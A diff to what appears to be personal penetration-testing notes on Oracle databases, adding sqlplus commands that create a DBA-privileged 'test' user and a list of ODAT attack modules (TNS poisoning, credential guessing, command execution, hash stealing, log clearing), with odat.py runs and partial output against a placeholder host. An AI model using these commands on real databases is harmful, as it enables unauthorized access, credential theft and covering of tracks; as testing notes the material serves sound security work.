@@ -164,7 +164,46 @@ SQL>
 
 
 
-#ODAT Check against all modules
+#Login as SYSDBA
+#XE=system identifier (find it)
+sqlplus user/password@x.x.x.x:1521/XE AS SYSDBA
+
+SQL> CREATE USER test IDENTIFIED by test; 
+
+User created.
+
+SQL> GRANT DBA TO test;
+
+Grant succeeded.
+
+
+
+#ODAT(Oracle Database Attacking Tool)
+    tnscmd            to communicate with the TNS listener
+    tnspoison         to exploit TNS poisoning attack
+    sidguesser        to know valid SIDs
+    passwordguesser   to know valid credentials
+    utlhttp           to send HTTP requests or to scan ports
+    httpuritype       to send HTTP requests or to scan ports
+    utltcp            to scan ports
+    ctxsys            to read files
+    externaltable     to read files or to execute system commands/scripts
+    dbmsxslprocessor  to upload files
+    dbmsadvisor       to upload files
+    utlfile           to download/upload/delete files
+    dbmsscheduler     to execute system commands without a standard output
+    java              to execute system commands
+    passwordstealer   to get hashed Oracle passwords
+    oradbg            to execute a bin or script
+    dbmslob           to download files
+    stealremotepwds   to steal hashed passwords thanks an authentication sniffing (CVE-2012-3137)
+    userlikepwd       to try each Oracle username stored in the DB like the corresponding pwd
+    smb               to capture the SMB authentication
+    privesc           to gain elevated access
+    cve               to exploit a CVE
+    search            to search in databases, tables and columns
+    unwrapper         to unwrap PL/SQL source code (no for 9i version)
+    clean             clean traces and logs
 python2.7 odat.py all -s x.x.x.x -d XE -U test -P test
 
 [1] (x.x.x.x:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?
@@ -195,7 +234,7 @@ python2.7 odat.py sidguesser -s x.x.x.x
 
 
 
-#checks against passwords/accounts odat location (can change to file)
+#Checks against passwords/accounts odat location (can change to file)
 python2.7 odat.py passwordguesser -s x.x.x.x -d XE -v
 
 [1] (x.x.x.x:1521): Searching valid accounts on the x.x.x.x server, port 1521
